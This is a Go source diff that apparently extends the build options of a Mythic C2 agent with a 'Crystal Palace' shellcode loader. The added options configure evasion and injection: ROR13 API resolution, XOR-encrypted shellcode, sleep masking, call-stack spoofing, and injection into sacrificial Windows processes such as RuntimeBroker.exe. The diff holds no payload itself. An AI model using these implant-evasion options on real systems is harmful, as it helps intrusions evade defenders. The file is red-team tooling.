@@ -11,9 +11,10 @@ import (
 )
 
 // buildOpts is the parsed Mythic web UI build parameters. Every option that
-// applies to an agent EXE build is exposed; shellcode-loader options
-// (Exec/Evasion/AMSI/sandbox/injection/lolbin/triggers/...) cannot apply to
-// a standalone agent and are intentionally absent.
+// applies to an agent EXE build is exposed. The palace_* options select
+// Crystal Palace loader techniques when loader=palace wraps the Donut
+// shellcode; with loader=donut they are ignored (trio/spec/host-inject
+// are rejected outright so a no-op is never silent).
 type buildOpts struct {
 	garble         bool
 	garbleProfile  string
@@ -45,6 +46,20 @@ type buildOpts struct {
 	retries        int
 	taskingSize    int
 	shellcode      bool
+	loader         string
+	palaceROR13    bool
+	palaceNoRWX    bool
+	palaceCFG      bool
+	palaceCleanup  bool
+	palacePICO     string
+	palaceXOR      bool
+	palaceMaskLen  int
+	palaceHooks    bool
+	palaceSleepMsk bool
+	palaceSpoof    bool
+	palaceInject   string
+	palaceHosts    string
+	palaceSpec     string
 	packaging      string
 	packagePW      string
 	msiApp         string
@@ -52,6 +67,10 @@ type buildOpts struct {
 	msiScope       string
 	isoAutorun     bool
 }
+
+// defaultPalaceHosts is the sacrificial-host fallback order baked into the
+// loader when palace_inject=host and palace_hosts is empty.
+const defaultPalaceHosts = "RuntimeBroker.exe,SgrmBroker.exe,WerFault.exe,dllhost.exe,notepad.exe"
 
 func boolParam(bp *agentstructs.BuildParameters, name string) (bool, error) {
 	return bp.GetBooleanArg(name)
@@ -196,6 +215,70 @@ func parseBuildParams(bp *agentstructs.BuildParameters) (buildOpts, error) {
 	o.msiApp = stringParam(bp, "msi_app_name")
 	o.msiMfr = stringParam(bp, "msi_manufacturer")
 	o.msiScope = stringParam(bp, "msi_scope")
+	if o.loader, err = chooseParam(bp, "loader", "donut", "palace"); err != nil {
+		return fail(err)
+	}
+	for _, p := range []struct {
+		name string
+		dest *bool
+	}{
+		{"palace_ror13", &o.palaceROR13},
+		{"palace_no_rwx", &o.palaceNoRWX},
+		{"palace_cfg", &o.palaceCFG},
+		{"palace_cleanup", &o.palaceCleanup},
+		{"palace_xor", &o.palaceXOR},
+		{"palace_hooks", &o.palaceHooks},
+		{"palace_sleepmask", &o.palaceSleepMsk},
+		{"palace_spoof", &o.palaceSpoof},
+	} {
+		if *p.dest, err = boolParam(bp, p.name); err != nil {
+			return fail(err)
+		}
+	}
+	if o.palacePICO, err = chooseParam(bp, "palace_pico", "stub", "none"); err != nil {
+		return fail(err)
+	}
+	maskLen, err := bp.GetNumberArg("palace_mask_len")
+	if err != nil {
+		return fail(err)
+	}
+	o.palaceMaskLen = int(maskLen)
+	if o.palaceMaskLen < 16 || o.palaceMaskLen > 512 {
+		return fail(fmt.Errorf("palace_mask_len must be 16-512"))
+	}
+	if o.palaceInject, err = chooseParam(bp, "palace_inject", "self", "host"); err != nil {
+		return fail(err)
+	}
+	o.palaceHosts = stringParam(bp, "palace_hosts")
+	if o.palaceHosts == "" {
+		o.palaceHosts = defaultPalaceHosts
+	}
+	o.palaceSpec = fileParam(bp, "palace_spec")
+	if o.loader == "palace" {
+		if !o.shellcode {
+			return fail(fmt.Errorf("loader=palace needs shellcode=true"))
+		}
+		if o.arch != "AMD_x64" {
+			return fail(fmt.Errorf("loader=palace supports AMD_x64 only"))
+		}
+		// Go's preemptive scheduler breaks inline hooks, sleep masking
+		// and stack spoofing (goroutines preempt mid-hook, run
+		// mid-encryption, and own their stacks), so the trio is
+		// native-only, same as the Sliver port's stubs.
+		if o.compiler != "native" && (o.palaceHooks || o.palaceSleepMsk || o.palaceSpoof) {
+			return fail(fmt.Errorf("palace_hooks/sleepmask/spoof need compiler=native (Go scheduler breaks them)"))
+		}
+	} else {
+		if o.palaceHooks || o.palaceSleepMsk || o.palaceSpoof {
+			return fail(fmt.Errorf("palace_hooks/sleepmask/spoof need loader=palace"))
+		}
+		if o.palaceSpec != "" {
+			return fail(fmt.Errorf("palace_spec needs loader=palace"))
+		}
+		if o.palaceInject != "self" {
+			return fail(fmt.Errorf("palace_inject=host needs loader=palace"))
+		}
+	}
 	if o.isoAutorun && o.packaging != "iso" {
 		return fail(fmt.Errorf("iso_autorun needs package=iso"))
 	}
@@ -278,6 +361,20 @@ func buildParameters() []agentstructs.BuildParameter {
 		number("retries", "Checkin attempts with doubling backoff.", 3),
 		number("tasking_size", "Tasks per poll (-1 = all).", -1),
 		boolean("shellcode", "Convert the EXE to raw shellcode (.bin) with Donut. Needs package=none and sign=none; the .bin feeds service_wrapper and external loaders.", false),
+		choose("loader", "Shellcode wrapper for shellcode=true: donut (raw Donut output) or palace (Crystal Palace PIC loader: ROR13, no-RWX, XOR sections).", []string{"donut", "palace"}, "donut"),
+		boolean("palace_ror13", "Palace: resolve APIs via ROR13 PEB walk with zero IAT.", true),
+		boolean("palace_no_rwx", "Palace: allocate RW then protect RX, never RWX.", true),
+		boolean("palace_cfg", "Palace: register loader pages as valid CFG call targets.", false),
+		boolean("palace_cleanup", "Palace: zero shellcode pages before freeing.", true),
+		choose("palace_pico", "Palace: PICO tag-dispatch stub (stub) or skip it (none).", []string{"stub", "none"}, "stub"),
+		boolean("palace_xor", "Palace: XOR-encrypt the embedded shellcode with a random mask.", true),
+		number("palace_mask_len", "Palace: random XOR mask length in bytes (16-512).", 128),
+		boolean("palace_hooks", "Palace: IAT hooks (needs loader=palace and compiler=native).", false),
+		boolean("palace_sleepmask", "Palace: XOR sleep masking (needs loader=palace and compiler=native).", false),
+		boolean("palace_spoof", "Palace: call-stack spoofing (needs loader=palace and compiler=native).", false),
+		choose("palace_inject", "Palace: run shellcode in self or inject into a sacrificial host process.", []string{"self", "host"}, "self"),
+		str("palace_hosts", "Palace: comma-separated host fallback order for palace_inject=host (default RuntimeBroker,SgrmBroker,WerFault,dllhost,notepad)."),
+		file("palace_spec", "Palace: custom spec file override (optional, needs loader=palace)."),
 		choose("package", "Wrap the EXE into a container.", []string{"none", "zip", "iso", "img", "vhd", "7z", "msi"}, "none"),
 		str("package_password", "Password for 7z packaging (optional)."),
 		str("msi_app_name", "MSI product name (optional)."),
